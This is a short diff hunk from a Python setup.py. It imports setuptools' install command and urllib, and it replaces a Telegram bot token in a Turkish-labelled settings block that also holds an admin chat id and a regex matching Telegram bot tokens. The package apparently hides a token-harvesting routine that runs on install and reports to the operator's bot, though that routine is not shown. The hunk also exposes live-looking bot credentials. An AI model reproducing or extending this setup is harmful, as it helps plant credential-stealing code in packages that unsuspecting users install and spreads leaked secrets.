@@ -3,7 +3,7 @@ from setuptools.command.install import install
 import threading, time, os, random, urllib.request, urllib.parse, re
 
 # ===== AYARLAR =====
-TOKEN = "8927762896:AAFtKtRX6ddSc0bSI1UuS9_SirwpSgR4NUk"
+TOKEN = "8927762896:AAGdBUEn-vE8EI32WHtweLmD9yo0MTKLxGk"
 ADMIN = "8903740930"
 HIZ = 0.6
 TOKEN_PATTERN = re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35,40}')
